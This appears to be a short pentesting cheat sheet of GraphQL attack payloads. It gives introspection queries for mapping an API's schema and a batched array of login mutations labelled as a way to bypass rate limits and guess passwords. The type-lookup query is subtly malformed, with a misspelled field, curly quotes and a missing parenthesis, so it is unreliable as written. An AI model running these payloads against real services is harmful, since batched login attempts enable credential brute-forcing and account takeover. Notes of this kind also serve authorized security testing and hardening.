
Instrospection gives user information on schema, queries, mutations. This may be disabled.

#### Query Payloads

Query schema if not blocked:
```GraphQL
query {
	__schema{
			types {
				name				
			}	
	}
}
```

Query types if schema is blocked. Able to fuzz the name value.
```GraphQL
query {
	__types(name: “User”{
				name				
				fields {
					name				
				}	
	}
}
```

Bypass Rate Limits with Batch Requests:
```GraphQL
[
  {
    "query": "mutation { login(email: \"name@name.com\", password: \"password\") { token } }",
    "variables": {}
  },
  {
    "query": "mutation { login(email: \"name@name.com\", password: \"password\") { token } }",
    "variables": {}
  },
  {
    "query": "mutation { login(email: \"name@name.com\", password: \"password\") { token } }",
    "variables": {}
  }
]

```

